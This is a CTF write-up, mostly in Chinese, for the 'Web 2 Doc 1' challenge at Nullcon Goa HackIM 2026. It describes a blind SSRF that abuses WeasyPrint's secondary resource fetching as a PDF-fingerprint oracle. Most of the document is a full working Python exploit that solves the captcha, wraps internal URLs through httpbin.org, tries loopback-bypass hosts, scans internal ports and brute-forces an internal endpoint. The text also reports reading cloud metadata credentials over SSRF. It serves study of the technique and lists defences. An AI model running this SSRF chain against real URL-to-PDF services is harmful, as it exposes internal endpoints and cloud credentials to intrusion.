---
title: "Web 2 Doc 1 - Nullcon Goa HackIM 2026 CTF"
category: "web"
subcategory: "ssrf"
type: "writeup"
tags: ["ssrf", "oracle", "web", "weasyprint", "flask", "imds", "base64", "eval", "regex", "nullcon-goa-hackim-2026-ctf", "2026", "ctf-writeup"]
summary: "\\- Local directory: web/Web2Doc1"
source:
  name: "CTFtime writeup #40544"
  url: "https://ctftime.org/writeup/40544"
ctf:
  name: "Nullcon Goa HackIM 2026 CTF"
  year: 2026
  challenge: "Web 2 Doc 1"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2026 CTF
- **Task:** Web 2 Doc 1
- **Author team:** 正规子群.AI
- **CTFtime tags:** ssrf, oracle, web, weasyprint
- **CTFtime:** <https://ctftime.org/writeup/40544>

---
## 112 Web 2 Doc 1

\- Category: `web`  
\- Value: `395`  
\- Solves: `36`  
\- Solved by me: `True`  
\- Local directory: `web/Web2Doc1`

### 题目描述  
> We needed an easy way to turn websites into PDF documents, so we implemented a simple flask app for that. Luckily, there are easy librarieres to do the hard work of print ing a website into a PDF...  
>  
> There's one particular endpoint we wanted to protect, so I'm providing you only that one function. The rest isn't as interesting anyway...  
>  
> Author: @gehaxelt

### 连接信息  
\- `52.59.124.14:5002`

### 附件下载地址  
\- `<https://ctf.nullcon.net/files/c4944535ed8519aa4b16d6cfac6beb4e/snippet.py?token=eyJ1c2VyX2lkIjo1MDYyLCJ0ZWFtX2lkIjoyMzEyLCJmaWxlX2lkIjo4Nn0.aYqlRQ.cIuvsFUKvT340EmC2uxm8mKmgBU>`

### 内存布局  
\- 暂无可解析二进制 或 本题主要是非二进制方向

### WP  
# Web 2 Doc 1 Writeup

\---

## 题目信息

\- 类型: Web  
\- 目标: 获取 `ENO{}` 格式 flag  
\- 远端: `52.59.124.14:5002`  
\- 已知条件: 首页是数学验证码，核心功能是把给定 URL 转成 PDF，题面提示只保护了一个特殊端点

\---

## 最终结果

最终拿到的 flag:

```text  
ENO{weasy_pr1nt_can_h4v3_bl1nd_ssrf_OK!}  
```

\---

## 总体思路

这题表面是 SSRF，实际是盲 SSRF + 渲染差分 Oracle。

核心点在于两段抓取链路:

1\. `/convert` 里的首跳抓取: 服务端 `requests.get(url)`   
2\. WeasyPrint 渲染阶段二次抓取: 渲染 HTML 时遇到 `<embed>/<object>//<link>` 会再次请求资源

我们最终利用的是第 2 段抓取对内部接口 `/admin/flag` 的“可见副作用”。

\---

## 服务行为复盘

### 1. `/admin/flag` 外部直连行为

\- 外部直接访问稳定返回:  
\- HTTP 403  
\- body: `<html><h1>NOT OK</h1></html>`

### 2. `/convert` 行为

\- 先过数学验证码  
\- 再取 `url` 对应内容并转 PDF  
\- 当取 URL 失败或上游异常时，返回 `{"error":"Failed to fetch URL"}`（400）

### 3. 关键观测

\- `/convert` 首跳抓取会携带头 `X-Fetcher: Internal`  
\- WeasyPrint 二次抓取不会带这个头，UA 为 `WeasyPrint 68.1`

这个差异是后续盲打的基础。

\---

## 漏洞本质

把 `/admin/flag` 看作字符判定器。

根据题面行为和黑盒结果可建模为:

\- 查询参数形式类似 `/admin/flag?i=<idx>&c=<ch>`  
\- 若字符匹配，返回可渲染“成功分支”  
\- 若不匹配，返回拒绝分支（常见是 403 + `NOT OK`）

虽然我们拿不到 `/admin/flag` 的直接内容，但能通过 PDF 指纹变化看出二次抓取结果差异，形成盲注 Oracle。

\---

## 数学化 Oracle 模型

设候选字符集为 $\Sigma$，flag 为 $s_0 s_1 \dots s_{n-1}$。

构造目标:

$u_{i,c} = \texttt{http://127.0.0.1:5000/admin/flag?i=}i\texttt{\&c=}c$

将其包进可触发二次抓取的 HTML（这里使用 `<embed>`），经 `/convert` 得到 PDF，记:

$P(i,c) = \text{PDF bytes after render}$

定义指纹函数:

$f(i,c) = (\text{len}(P(i,c)), \text{sha1}(P(i,c)))$

再取一个稳定错误基线:

$f_{base} = f(9999, a)$

判定规则:

\- 若 $f(i,c) \neq f_{base}$，则认为 $c = s_i$  
\- 否则继续尝试下一个字符

复杂度约为:

$O(n \cdot |\Sigma|)$

\---

## 利用脚本

文件: `[solve_chall.py](http://solve_chall.py)`

我在现有脚本基础上做了两类增强:

1\. 断点续跑   
新增 `--start-prefix`，可从已知前缀继续（例如 `ENO{`）。

2\. 速度调优   
新增:  
\- `--embed-timeout`  
\- `--embed-retries`

用于降低每个字符探测延迟，减少等待时间。

\---

## 关键命令

### 1. 常规跑法

```bash  
python3 -u [solve_chall.py](http://solve_chall.py) \  
\--remote \  
\--embed-bruteforce \  
\--max-len 64 \  
\--alphabet 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_'  
```

### 2. 已知前缀续跑

```bash  
python3 -u [solve_chall.py](http://solve_chall.py) \  
\--remote \  
\--embed-bruteforce \  
\--start-prefix 'ENO{weasy_pr' \  
\--embed-timeout 7 \  
\--embed-retries 2 \  
\--max-len 64 \  
\--alphabet 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_'  
```

### 3. 尾部补字符

在恢复到 `ENO{weasy_pr1nt_can_h4v3_bl1nd_ssrf_OK` 后，  
发现下一位是 `!`（不在默认字母表里），单独扩展符号集定位该位，然后拿到 `}` 结束。

\---

## 进展与尝试记录

下面是本题里做过的主要尝试，包含失败路线，便于复盘。

### A. 直接 SSRF 读 `/admin/flag`

\- 试了大量 host 变体:  
\- `127.0.0.1`  
\- `localhost`  
\- `127.1`  
\- `2130706433`  
\- `0x7f000001`  
\- `017700000001`  
\- `::ffff:127.0.0.1`  
\- 结果: 对 `/admin/flag` 仍失败（`Failed to fetch URL`）

### B. 头部伪造绕过

\- 伪造过:  
\- `X-Forwarded-For`  
\- `X-Real-IP`  
\- `Forwarded`  
\- `Host`  
\- `X-Fetcher`  
\- `Authorization`  
\- 结果: 外部直连始终 `403 NOT OK`

### C. 路径归一化与编码绕过

\- 例如:  
\- `/admin//flag`  
\- `/admin/.//flag`  
\- `%2f`、`%2e`、大小写路径  
\- 现象: `//` 会触发 308 跳转，但未直接泄露 flag

### D. WeasyPrint 附件链尝试

\- 用 `` 测试二次抓取  
\- 证实二次抓取 UA 为 WeasyPrint，且不带 `X-Fetcher`  
\- 对 `/admin/flag` 直接附件抓取仍无直接正文，但给了“盲差分可行”信号

### E. IMDS 探索

\- 可读到 `169.254.169.254` 元数据及临时凭据  
\- 与本题最终 flag 路线无直接收敛关系  
\- 作为旁证，确认 SSRF 面较大，但题目核心仍在 `/admin/flag` 判定逻辑

### F. 最终收敛

\- 把 `/admin/flag` 当字符判定器  
\- 用 PDF 指纹差分做盲爆破  
\- 先恢复出 `ENO{weasy_pr...`  
\- 再通过续跑与扩展字母表补全尾部 `!}`

\---

## 内存布局与对象生命周期

这里给出本题对应的“服务端对象内存布局”，重点是 Python 进程中对象如何流转。

### 1. 进程内对象布局

```text  
[Flask Worker Process]  
|  
|-- request context  
| |- form['url']  
| |- form['captcha_answer']  
|  
|-- captcha state (session / temporary vars)  
|  
|-- requests Response (首跳抓取)  
| |- status_code  
| |- headers  
| |- body(html string)  
|  
|-- WeasyPrint render objects  
| |- DOM tree  
| |- layout tree  
| |- subresource fetch tasks (二次抓取队列)  
|  
|-- PDF buffer (bytes in memory)  
|- object streams  
|- xref  
|- final bytes sent to client  
```

### 2. 与漏洞相关的关键“内存差分”

当 `<embed src=".../admin/flag?i=x&c=y">` 的二次请求结果不同，渲染树不同，最终 PDF 对象流也不同。

所以在内存层面上会体现为:

\- PDF 字节长度变化 $\Delta \text{len} \neq 0$  
\- 对象流内容变化 $\Delta \text{sha1} \neq 0$

这就是我们使用 $f(i,c)$ 作为盲 Oracle 的根本原因。

### 3. 为什么可盲化

虽然看不到 `/admin/flag` 的正文，但服务端会把二次请求结果“投影”到 PDF 内存对象，再返回给我们。   
我们只需要比较投影后的摘要，不需要直接读到真实文本。

\---

## 关键坑点

1\. 默认字符集不含 `!`   
导致在接近末尾时出现“看似结束但没有 `}`”的假停顿。

2\. 网络抖动导致偶发 `RemoteDisconnected`   
需要保留小次数重试，不能完全去掉。

3\. 过大的超时会拖慢总时长   
`embed-timeout` 适当下调可显著提速。

\---

## 防御建议

1\. 对所有内部敏感端点禁 SSRF 可达路径，不仅是首跳，也包括渲染器二次抓取。  
2\. WeasyPrint 禁止或严格限制外部资源抓取（尤其是内网地址）。  
3\. 不要把敏感判定结果通过可观测渲染副作用暴露给外部（长度、结构、时间差）。  
4\. `/admin/flag` 这类接口应采用强鉴权，不应把字符比较逻辑暴露在可探测 HTTP 行为里。

\---

## 当前状态

\- 本题已成功拿到完整 flag  
\- 利用脚本可复现  
\- WP 已补全失败路径与最终收敛路径，后续可直接整理到赛后总仓库

### Exploit  
#### web/Web2Doc1/solve_chall.py

```python  
#!/usr/bin/env python3  
import argparse  
import base64  
import hashlib  
import re  
import string  
import sys  
import urllib.parse  
import zlib  
from typing import Optional, Tuple

import requests

BASE = "http://52.59.124.14:5002"

def parse_captcha(html: str) -> int:  
m = re.search(r"Math Challenge:\s*([^<]+)\s*= \?", html)  
if not m:  
raise ValueError("captcha not found")  
expr = m.group(1).strip()  
if not re.fullmatch(r"[0-9+\\-*/\s]+", expr):  
raise ValueError(f"unexpected captcha expr: {expr!r}")  
return int(eval(expr, {"__builtins__": {}}, {}))

def _decode_pdf_text_candidates(pdf: bytes) -> str:  
# Very small PDF text extractor for Flate streams.  
out = []  
streams = list(_iter_flate_streams(pdf))

# Build a CID -> Unicode map from ToUnicode CMaps if present.  
cmap = {}  
for dec in streams:  
if b"begincmap" not in dec:  
continue  
lines = dec.decode("latin-1", errors="ignore").splitlines()  
mode = None  
for line in lines:  
s = line.strip()  
if s.endswith("beginbfchar"):  
mode = "bfchar"  
continue  
if s.endswith("beginbfrange"):  
mode = "bfrange"  
continue  
if s.startswith("endbfchar") or s.startswith("endbfrange"):  
mode = None  
continue

if mode == "bfchar":  
m = re.match(r"<([0-9A-Fa-f]{4})>\s*<([0-9A-Fa-f]{4,8})>", s)  
if not m:  
continue  
src = int(m.group(1), 16)  
dst_hex = m.group(2)  
try:  
dst = bytes.fromhex(dst_hex).decode("utf-16-be", errors="ignore")  
except Exception:  
dst = ""  
if dst:  
cmap[src] = dst  
elif mode == "bfrange":  
# Forms:  
# <0001> <0003> <0041>  
m = re.match(r"<([0-9A-Fa-f]{4})>\s*<([0-9A-Fa-f]{4})>\s*<([0-9A-Fa-f]{4,8})>", s)  
if m:  
a = int(m.group(1), 16)  
b = int(m.group(2), 16)  
base = int(m.group(3), 16)  
for i, code in enumerate(range(a, b + 1)):  
try:  
dst = (base + i).to_bytes(2, "big").decode("utf-16-be", errors="ignore")  
except Exception:  
dst = ""  
if dst:  
cmap[code] = dst

for dec in streams:  
# Literal text strings: (...) Tj / TJ  
for m in re.finditer(rb"\\(([^)]{1,240})\\)\s*TJ?", dec):  
try:  
t = m.group(1).decode("latin-1", errors="ignore")  
except Exception:  
continue  
if t:  
out.append(t)

# Hex text chunks inside arrays or standalone.  
for m in re.finditer(rb"<([0-9A-Fa-f]{4,400})>", dec):  
hx = m.group(1).decode()  
if len(hx) % 4 != 0:  
continue  
chars = []  
ok = True  
for i in range(0, len(hx), 4):  
code = int(hx[i : i + 4], 16)  
ch = cmap.get(code)  
if ch is None:  
ok = False  
break  
chars.append(ch)  
if ok and chars:  
t = "".join(chars)  
if t.strip():  
out.append(t)

joined = " | ".join(out)  
return joined

def _iter_flate_streams(pdf: bytes):  
idx = 0  
while True:  
pos = pdf.find(b"stream", idx)  
if pos < 0:  
break  
start = pos + len(b"stream")  
if pdf[start : start + 2] == b"\r\n":  
start += 2  
elif pdf[start : start + 1] in (b"\n", b"\r"):  
start += 1  
end = pdf.find(b"endstream", start)  
if end < 0:  
break  
header = pdf[max(0, pos - 220) : pos]  
if b"/FlateDecode" in header:  
raw = pdf[start:end]  
try:  
dec = zlib.decompress(raw)  
yield dec  
except Exception:  
pass  
idx = end + len(b"endstream")

def _pdf_marker(pdf: bytes) -> str:  
t = _decode_pdf_text_candidates(pdf).upper()  
if "NOT OK" in t:  
return "NOT_OK"  
if re.search(r"(^|\\\W)OK($|\\\W)", t):  
return "OK"  
return "UNK"

def do_convert_raw(s: requests.Session, url: str, timeout: float = 10.0) -> requests.Response:  
r = s.get(f"{BASE}/", timeout=timeout)  
r.raise_for_status()  
answer = parse_captcha(r.text)

resp = s.post(  
f"{BASE}/convert",  
data={"url": url, "captcha_answer": str(answer)},  
timeout=timeout,  
)  
return resp

def do_convert(s: requests.Session, url: str, timeout: float = 10.0) -> Tuple[bool, int, str, str]:  
resp = do_convert_raw(s, url, timeout=timeout)

ctype = resp.headers.get("Content-Type", "")  
if resp.status_code == 200 and "application/pdf" in ctype:  
h = hashlib.sha1(resp.content).hexdigest()[:12]  
marker = _pdf_marker(resp.content)  
return True, resp.status_code, ctype, f"PDF len={len(resp.content)} sha1={h} marker={marker}"

msg = ""  
try:  
msg = resp.json().get("error", "")  
except Exception:  
msg = resp.text[:200]  
return False, resp.status_code, ctype, msg

def probe_hosts(s: requests.Session, port: int) -> Optional[str]:  
candidates = [  
f"127.0.0.1:{port}",  
f"localhost:{port}",  
f"0.0.0.0:{port}",  
f"[::1]:{port}",  
f"[::ffff:127.0.0.1]:{port}",  
f"127.1:{port}",  
f"0177.0.0.1:{port}",  
f"2130706433:{port}",  
f"0x7f000001:{port}",  
f"127.0.0.1.nip.io:{port}",  
f"localhost.localdomain:{port}",  
f"lvh.me:{port}",  
f"localtest.me:{port}",  
f"52.59.124.14:{port}",  
]

paths = ["/", "/admin/flag?i=0&c=a"]

print("[+] Probing URL candidates...")  
for host in candidates:  
for path in paths:  
url = f"http://{host}{path}"  
try:  
ok, code, ctype, info = do_convert(s, url)  
except Exception as e:  
print(f"[-] {url} -> EXC: {e}")  
continue

status = "OK" if ok else "NO"  
print(f"[{status}] {url} -> code={code} ctype={ctype} info={info}")

print("[+] Probe complete")  
return None

def extract_flag(s: requests.Session, base_url: str, max_len: int = 128, alphabet: Optional[str] = None) -> str:  
if alphabet is None:  
alphabet = string.ascii_letters + string.digits + "{}_!@#$%^&*()-=+[]:;,.?/\\\|~<>"  
flag = ""

print(f"[+] Bruteforcing with oracle base: {base_url}")  
for idx in range(max_len):  
found = None  
for ch in alphabet:  
url = f"{base_url}/admin/flag?i={idx}&c={ch}"  
try:  
ok, code, ctype, info = do_convert(s, url)  
except Exception as e:  
print(f"[!] i={idx} c={ch!r} -> EXC {e}")  
continue

if ok:  
found = ch  
flag += ch  
print(f"[+] i={idx}: {ch!r} => {flag}")  
break  
else:  
# Keep output sparse  
if ch in "{}_":  
print(f"[-] i={idx} c={ch!r} -> {code} {info}")

if found is None:  
print(f"[!] Stopped at index {idx}, no matching character")  
break

if found == "}" and "{" in flag:  
print("[+] Flag terminator found")  
break

return flag

def make_httpbin_base64_url(html: str) -> str:  
b64 = base64.urlsafe_b64encode(html.encode()).decode()  
return "http://httpbin.org/base64/" + urllib.parse.quote(b64, safe="-_")

def object_oracle_url(target_url: str, fallback_text: str = "FB") -> str:  
html = (  
"<html><body><h1>P</h1>"  
f'<object type="text/html" data="{target_url}">{fallback_text}</object>'  
"</body></html>"  
)  
return make_httpbin_base64_url(html)

def embed_oracle_url(target_url: str) -> str:  
html = (  
"<html><body><h1>P</h1>"  
f'<embed type="text/html" src="{target_url}"></embed>'  
"</body></html>"  
)  
return make_httpbin_base64_url(html)

def parse_pdf_fingerprint(info: str) -> Tuple[Optional[int], Optional[str]]:  
m_len = re.search(r"len=(\d+)", info)  
m_sha = re.search(r"sha1=([0-9a-f]+)", info)  
l = int(m_len.group(1)) if m_len else None  
h = m_sha.group(1) if m_sha else None  
return l, h

def object_probe_index(  
s: requests.Session,  
idx: int,  
port: int = 5000,  
alphabet: str = string.ascii_letters + string.digits + "{}_",  
) -> None:  
baseline_target = f"http://127.0.0.1:{port}/admin/flag?i=9999&c=a"  
baseline_wrap = object_oracle_url(baseline_target)  
ok, code, ctype, info = do_convert(s, baseline_wrap)  
if not ok:  
print(f"[!] Baseline failed: code={code} ctype={ctype} info={info}")  
return

base_len, base_sha = parse_pdf_fingerprint(info)  
print(f"[+] Baseline fingerprint len={base_len} sha1={base_sha}")  
print(f"[+] Probing index {idx}")

hits = []  
for ch in alphabet:  
target = f"http://127.0.0.1:{port}/admin/flag?i={idx}&c={urllib.parse.quote(ch, safe='')}"  
wrapped = object_oracle_url(target)  
try:  
ok, code, ctype, info = do_convert(s, wrapped, timeout=15.0)  
except Exception as e:  
print(f"[!] i={idx} c={ch!r} -> EXC: {e}")  
continue  
if not ok:  
print(f"[-] i={idx} c={ch!r} -> request failed: {code} {info}")  
continue  
l, h = parse_pdf_fingerprint(info)  
print(f"[.] i={idx} c={ch!r} -> len={l} sha1={h}")  
if l != base_len or h != base_sha:  
hits.append((ch, l, h, info))  
print(f"[+] CAND i={idx} c={ch!r} -> {info}")

if not hits:  
print("[!] No non-baseline candidates found")  
else:  
print(f"[+] Candidates for index {idx}: {', '.join(repr(x[0]) for x in hits)}")

def embed_probe_index(  
s: requests.Session,  
idx: int,  
port: int = 5000,  
alphabet: str = string.ascii_letters + string.digits + "{}_",  
) -> None:  
baseline_target = f"http://127.0.0.1:{port}/admin/flag?i=9999&c=a"  
baseline_wrap = embed_oracle_url(baseline_target)  
ok, code, ctype, info = do_convert(s, baseline_wrap)  
if not ok:  
print(f"[!] Baseline failed: code={code} ctype={ctype} info={info}")  
return

base_len, base_sha = parse_pdf_fingerprint(info)  
print(f"[+] Embed baseline len={base_len} sha1={base_sha}")  
print(f"[+] Probing index {idx} with embed oracle")

hits = []  
for ch in alphabet:  
target = f"http://127.0.0.1:{port}/admin/flag?i={idx}&c={urllib.parse.quote(ch, safe='')}"  
wrapped = embed_oracle_url(target)  
try:  
ok, code, ctype, info = do_convert(s, wrapped, timeout=15.0)  
except Exception as e:  
print(f"[!] i={idx} c={ch!r} -> EXC: {e}")  
continue  
if not ok:  
print(f"[-] i={idx} c={ch!r} -> request failed: {code} {info}")  
continue  
l, h = parse_pdf_fingerprint(info)  
print(f"[.] i={idx} c={ch!r} -> len={l} sha1={h}")  
if l != base_len or h != base_sha:  
hits.append((ch, l, h, info))  
print(f"[+] CAND i={idx} c={ch!r} -> {info}")

if not hits:  
print("[!] No non-baseline candidates found")  
else:  
print(f"[+] Candidates for index {idx}: {', '.join(repr(x[0]) for x in hits)}")

def _embed_fingerprint_for_char(  
s: requests.Session, idx: int, ch: str, port: int, timeout: float = 15.0  
) -> Tuple[Optional[int], Optional[str], str]:  
target = f"http://127.0.0.1:{port}/admin/flag?i={idx}&c={urllib.parse.quote(ch, safe='')}"  
wrapped = embed_oracle_url(target)  
ok, code, ctype, info = do_convert(s, wrapped, timeout=timeout)  
if not ok:  
return None, None, f"ERR:{code}:{info}"  
l, h = parse_pdf_fingerprint(info)  
return l, h, info

def embed_extract_flag(  
s: requests.Session,  
max_len: int = 96,  
port: int = 5000,  
alphabet: str = string.ascii_letters + string.digits + "{}_",  
start_prefix: str = "",  
req_timeout: float = 15.0,  
retries: int = 3,  
) -> str:  
baseline_target = f"http://127.0.0.1:{port}/admin/flag?i=9999&c=a"  
baseline_wrap = embed_oracle_url(baseline_target)  
ok, code, ctype, info = do_convert(s, baseline_wrap)  
if not ok:  
print(f"[!] Baseline failed: code={code} ctype={ctype} info={info}")  
return ""  
base_len, base_sha = parse_pdf_fingerprint(info)  
print(f"[+] Embed baseline len={base_len} sha1={base_sha}")

flag = start_prefix  
start_idx = len(start_prefix)  
print(f"[+] Starting from prefix={start_prefix!r} (idx={start_idx})")

for idx in range(start_idx, max_len):  
candidates = []  
print(f"[+] Index {idx}")  
for ch in alphabet:  
tries = 0  
while True:  
tries += 1  
try:  
l, h, meta = _embed_fingerprint_for_char(s, idx, ch, port=port, timeout=req_timeout)  
break  
except Exception as e:  
if tries >= retries:  
print(f"[!] i={idx} c={ch!r} -> EXC {e}")  
l, h = None, None  
meta = "EXC"  
break  
if l is None and h is None:  
continue  
if l != base_len or h != base_sha:  
print(f"[+] CAND i={idx} c={ch!r} -> len={l} sha1={h}")  
candidates.append((ch, l, h, meta))

if not candidates:  
print(f"[!] No candidate at index {idx}, stopping")  
break

# Recheck candidates once to reduce transient false positives.  
stable = []  
for ch, _, _, _ in candidates:  
try:  
l, h, _meta = _embed_fingerprint_for_char(s, idx, ch, port=port, timeout=req_timeout)  
except Exception as e:  
print(f"[!] Recheck EXC i={idx} c={ch!r}: {e}")  
continue  
if l != base_len or h != base_sha:  
stable.append(ch)

if not stable:  
print(f"[!] Candidates unstable at index {idx}, stopping")  
break  
if len(stable) > 1:  
print(f"[!] Multiple stable candidates at index {idx}: {stable}")  
chosen = stable[0]  
flag += chosen  
print(f"[+] Flag so far: {flag}")

if chosen == "}" and "{" in flag:  
print("[+] Reached closing brace, stopping")  
break

return flag

def parse_port_spec(spec: str) -> list[int]:  
ports = set()  
for part in spec.split(","):  
part = part.strip()  
if not part:  
continue  
if "-" in part:  
a, b = part.split("-", 1)  
a = int(a)  
b = int(b)  
if a > b:  
a, b = b, a  
for p in range(a, b + 1):  
ports.add(p)  
else:  
ports.add(int(part))  
return sorted(p for p in ports if 1 <= p <= 65535)

def scan_local_ports(s: requests.Session, host: str, port_spec: str) -> None:  
ports = parse_port_spec(port_spec)  
print(f"[+] Scanning {host} ports: {port_spec} ({len(ports)} ports)")  
for p in ports:  
url = f"http://{host}:{p}/"  
try:  
ok, code, ctype, info = do_convert(s, url, timeout=5.0)  
except Exception as e:  
print(f"[!] {url} -> EXC: {e}")  
continue  
status = "OK" if ok else "NO"  
print(f"[{status}] {url} -> code={code} ctype={ctype} info={info}")

def main() -> int:  
parser = argparse.ArgumentParser()  
parser.add_argument("--remote", action="store_true", help="run against remote target")  
parser.add_argument("--probe", action="store_true", help="probe host bypass candidates")  
parser.add_argument("--url", action="append", default=[], help="test a specific URL (can repeat)")  
parser.add_argument("--show-pdf-text", action="store_true", help="show extracted PDF text for --url")  
parser.add_argument("--dump-streams", action="store_true", help="dump flate stream previews for --url")  
parser.add_argument("--object-probe-index", type=int, help="probe one flag index using object oracle")  
parser.add_argument("--embed-probe-index", type=int, help="probe one flag index using embed oracle")  
parser.add_argument("--embed-bruteforce", action="store_true", help="recover flag using embed oracle")  
parser.add_argument("--object-port", type=int, default=5000, help="target internal port for object oracle")  
parser.add_argument("--scan-host", help="scan host ports via /convert (e.g. 127.0.0.1)")  
parser.add_argument(  
"--scan-ports",  
default="80,443,5000,5001,5002,5003,7000,8000,8080,8081,8443,8888,9000",  
help="port spec like 80,443,5000-5010",  
)  
parser.add_argument(  
"--alphabet",  
default=string.ascii_letters + string.digits + "{}_",  
help="alphabet for bruteforce/probe",  
)  
parser.add_argument("--base", default="http://127.0.0.1:5002", help="base URL for admin endpoint")  
parser.add_argument("--max-len", type=int, default=96)  
parser.add_argument("--start-prefix", default="", help="resume bruteforce from known prefix")  
parser.add_argument("--embed-timeout", type=float, default=15.0, help="per-request timeout for embed bruteforce")  
parser.add_argument("--embed-retries", type=int, default=3, help="retry count for embed bruteforce")  
args = parser.parse_args()

if not args.remote:  
print("Use --remote", file=sys.stderr)  
return 1

s = requests.Session()  
s.trust_env = False  
s.headers.update({"User-Agent": "Mozilla/5.0"})

if args.probe:  
probe_hosts(s, 5002)  
return 0

if args.url:  
for u in args.url:  
try:  
if args.show_pdf_text:  
resp = do_convert_raw(s, u)  
ctype = resp.headers.get("Content-Type", "")  
if resp.status_code == 200 and "application/pdf" in ctype:  
txt = _decode_pdf_text_candidates(resp.content)  
txt = re.sub(r"\\\s+", " ", txt).strip()  
if len(txt) > 600:  
txt = txt[:600] + "..."  
print(f"[TXT] {u} -> {txt}")  
h = hashlib.sha1(resp.content).hexdigest()[:12]  
print(f"[PDF] len={len(resp.content)} sha1={h} marker={_pdf_marker(resp.content)}")  
if args.dump_streams:  
for i, dec in enumerate(_iter_flate_streams(resp.content)):  
preview = dec[:300].decode("latin-1", errors="replace")  
preview = preview.replace("\n", "\\\n")  
print(f"[STREAM {i}] {preview}")  
else:  
msg = ""  
try:  
msg = resp.json().get("error", "")  
except Exception:  
msg = resp.text[:200]  
print(f"[NO] {u} -> code={resp.status_code} ctype={ctype} info={msg}")  
continue

ok, code, ctype, info = do_convert(s, u)  
except Exception as e:  
print(f"[-] {u} -> EXC: {e}")  
continue  
status = "OK" if ok else "NO"  
print(f"[{status}] {u} -> code={code} ctype={ctype} info={info}")  
return 0

if args.object_probe_index is not None:  
object_probe_index(s, args.object_probe_index, port=args.object_port, alphabet=args.alphabet)  
return 0

if args.embed_probe_index is not None:  
embed_probe_index(s, args.embed_probe_index, port=args.object_port, alphabet=args.alphabet)  
return 0

if args.embed_bruteforce:  
flag = embed_extract_flag(  
s,  
max_len=args.max_len,  
port=args.object_port,  
alphabet=args.alphabet,  
start_prefix=args.start_prefix,  
req_timeout=args.embed_timeout,  
retries=args.embed_retries,  
)  
print(f"[+] Recovered (partial/full): {flag}")  
return 0

if args.scan_host:  
scan_local_ports(s, args.scan_host, args.scan_ports)  
return 0

flag = extract_flag(s, args.base, max_len=args.max_len, alphabet=args.alphabet)  
print(f"[+] Recovered (partial/full): {flag}")  
return 0

if __name__ == "__main__":  
raise SystemExit(main())  
```

\---
